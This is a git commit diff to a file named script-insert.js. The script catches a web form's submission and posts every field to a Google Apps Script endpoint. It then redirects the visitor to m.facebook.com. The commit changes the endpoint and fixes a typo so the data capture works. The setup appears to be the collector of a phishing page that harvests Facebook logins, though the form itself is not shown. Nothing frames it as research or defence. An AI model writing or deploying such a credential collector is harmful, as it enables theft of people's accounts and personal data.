d249dd3aaad0b634c512e5984573ce5946d644b7
vestaddbox@gmail.com <vestaddbox@gmail.com>
2022-08-08 19:27:07 +0100

    bb

--- script-insert.js
+++ script-insert.js
@@ -1,11 +1,11 @@
 const form = document.querySelector("#form")
-    const scriptURL = 'https://script.google.com/macros/s/AKfycbz-yMRRlPdzAfEp5jtjgs0Hbqt7cb-7voow1eWMkVw0HE89qZYnvNbtBgNiEFKUNNQU/exec'
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbx400-OITHD696EM-oXbbKIR-wBQnInYb3mjze4gs7gABMFvQCp-KR01Xh_sKAh5Q3g9A/exec'
 
     form.addEventListener('submit', e => {
       e.preventDefault()
 
       console.log(form)
-      fetch(scriptURL, { method: 'POST', body: new FormData(fvpallerorm) })
+      fetch(scriptURL, { method: 'POST', body: new FormData(form) })
         .then(response => { window.location.href='http://m.facebook.com' })
         .catch(error => alert('Error!', error.message))
     })
